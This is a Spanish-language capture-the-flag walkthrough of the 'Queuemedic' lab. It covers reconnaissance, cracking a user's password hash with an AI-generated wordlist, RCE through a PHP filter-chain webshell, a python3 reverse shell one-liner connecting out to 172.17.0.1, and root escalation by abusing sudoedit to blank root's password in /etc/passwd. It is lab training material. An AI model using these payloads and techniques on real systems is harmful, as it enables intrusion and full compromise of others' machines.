# Docerlabs - Queuemedic - Hard

### 1) Iniciamos la maquina.
```bash
sudo ./auto_deploy.sh queuemedic.tar
```

![](ANEXOS/Pasted%20image%2020240925173632.png)

### 2) Nos dirigimos al navegador e ingresamos la dirección http://172.17.0.2.
![](ANEXOS/Pasted%20image%2020240925173823.png)

***Al ingresar a la url se carga un formulario de acceso.***

![](ANEXOS/Pasted%20image%2020240925180151.png)

***Analizando la web con wappalyzer no se encontró ninguna información que nos pueda llamar la atención para investigar.***

### 3) Realizamos un escaneo de puertos con nmap.
```shell
nmap -sV -Pn 172.17.0.2 
```

![](ANEXOS/Pasted%20image%2020240925174021.png)

***Al terminar el proceso se encontró un solo puerto abierto el 80 con un servidor Apache.***

### 4) Realizamos una búsqueda de carpetas y archivos con gobuster.

```shell
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt --exclude-length 0,275
```

![](ANEXOS/Pasted%20image%2020240925174813.png)

***Al terminar el proceso se encontro con varias carpetas con posibles datos sensibles ellas son /backup y /db.***

### 5) Nos dirigimos a la url de /backup http://172.17.0.2/backup.

![](ANEXOS/Pasted%20image%2020240925175148.png)

***Al ingresar vemos un archivo con extensión .zip lo cual procedemos a descargarlo para su posterior análisis.***

### 6) Nos dirigimos a la url de /db http://172.17.0.2/db.
 
![](ANEXOS/Pasted%20image%2020240925175503.png)

***Al ingresar observamos un archivo con extensión .db lo cual procedemos a descargarlo para su posterior análisis.***

### 7) Analizamos los archivos descargados:
a) Descomprimimos y verificamos el contenido del archivo backup.zip.	
	
![](ANEXOS/Pasted%20image%2020240925175854.png)

***Nos encontramos con un backup completo del sistema Clinic Queuing System, en el cual realizando un análisis de cada archivo se encontró una posible vulnerabilidad en "index.php "en el método que utiliza para llamar a "page".***
	
b) Abrimos el archivo clinic_queuing_db.db con sqlitebrowser.

![](ANEXOS/Pasted%20image%2020240925180826.png)

***Al abrir la base de datos podemos ver las tablas de la db y desplegamos la tabla user_list***

![](ANEXOS/Pasted%20image%2020240925181901.png)

***Al realizar la consulta sobre esta tabla user_list, se puede observar el contenido del mismo con los datos de username y password en la cual esta encriptada.***
	
### 8) Ataque de diccionario a los hashes encontrados.
a) ***Al realizar el ataque por fuerza bruta no se pudo obtener la contraseña de Administrador.***
b) ***Para obtener una lista con posibles contraseña para el usuario "Jessica Castro" utilizamos ChatGpt en el cual nos brinda una lista de 100 posibles contraseñas.***
	
![](ANEXOS/Pasted%20image%2020240925183606.png)
![](ANEXOS/Pasted%20image%2020240925183512.png)

***Al finalizar el ataque por fuerza bruta con john the ripper pudo obtener una contraseña que concuerda con el hash del usuario "jessica" la cual es "j.castro".***

### 9) Volviendo la pagina principal en el login http://172.17.0.2.
![](ANEXOS/Pasted%20image%2020240925184644.png)

***Iniciamos sesión con las credenciales obtenidas.***
![](ANEXOS/Pasted%20image%2020240925184845.png)

***Analizando la pagina web ademas de un xss en el registro de usuarios y pasientes no se encontro.***

### 10) Busueda de Clinic Queuing System (php) en google.
![](ANEXOS/Pasted%20image%2020240925185754.png)
***Al realizar la búsqueda en google no encontramos con el cms pero también arrojo en exploit-db un exploit en el cual se pude obtener RCE.***

### 11) Descarga https://www.exploit-db.com/exploits/52008 y análisis del exploit.

### 12) Al descargar y ejecutar el exploit vemos que no realiza la explotación del servicio.
![](ANEXOS/Pasted%20image%2020241011082236.png)

### 13) Analizando en detalle el código del sitio y el exploit encontré que había unas validaciones que hace la pagina por lo cual el exploit no puede realizar correctamente su cometido. 

### 14) Fijándome mas en detalle tengo acceso a un usuario que es administrador y en el exploit crea un usuario administrador entonces lo que se me ocurrió a analizar en que parámetros inyecta para obtener un RCE.
![](ANEXOS/Pasted%20image%2020241011083138.png)

### 15) Como se observa en la imagen el exploit inyecta en el parámetro `?page=` un `filter_chain` y después en el parámetro `&0=`, crea el archivo `rce.php` y escribe el contendido ``<?=`$_GET[0]`?>`` parseado en base64.

### 16) Entonces lo que tuve que hacer es unir todo el contenido de la variable `filter_chain` mas el parámetro 0 y ejecutarlo directamente en el navegador.
![](ANEXOS/Pasted%20image%2020241011085843.png)

***El `filter_chain` es mas extenso pero así quedaría para inyectarlo directamente al navegador.***
![](ANEXOS/Pasted%20image%2020241011090029.png)

***Ya tengo ejecución de comandos ***

### 17) Ahora creo una reverse shell utilizando python3.

 ```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
 y en mi consola obtengo la conexión.
![](ANEXOS/Pasted%20image%2020241011090521.png)
	 
### 18) Luego del tratamiento de la tty, listo el contenido del escritorio donde estoy ubicado y también listo la carpeta /home, en el cual encontré una carpeta jessica del que creo que es un usuario de sistema entonces realizo un cat al archivo /etc/passwd y encuentro al usuario.
![](ANEXOS/Pasted%20image%2020241011092359.png)

### 19) Como tengo un usuario llamado con el mismo nombre que el usuario de la web y como ya tengo una contraseña lo que hago es poner la misma contraseña y ahi ingreso al usuario jessica del sistema.
![](ANEXOS/Pasted%20image%2020241011092814.png)

### 20) Ahora con `sudo -l` listo los privilegios que tiene el usuario jessica, en este caso tiene los privilegios root para utilizar suodedit en la varpeta /var/www/html/.
![](ANEXOS/Pasted%20image%2020241011102543.png)

### 21) Para elevar privilegios a root primeramente tengo que setear el editor global a nano ya que vim no esta instalado y al editarlo también pongo la opción que se me abra para editar el archivo /etc/passwd.
![](ANEXOS/Pasted%20image%2020241011103016.png)

### 22) Ahora que ya tengo todo seteado abro el editor en la ubicación que vimos al listar son sudo -l, entonces ejecuto sudoedit /var/www/html/, Se me abrirá automáticamente el archivo /etc/passwd.
![](ANEXOS/Pasted%20image%2020241011103622.png)

### 23) Ahora que obtuve acceso para editar el archivo /etc/passwd como root lo que queda es eliminar la letra x que esta en el usuario root y esto significa que le quito la contraseña que tenia asignada anteriormente.
![](ANEXOS/Pasted%20image%2020241011103944.png)

### 24) Guardo los cambios y salgo y luego escribo su y presiono enter y ya obtengo acceso a root.
![](ANEXOS/Pasted%20image%2020241011104942.png)
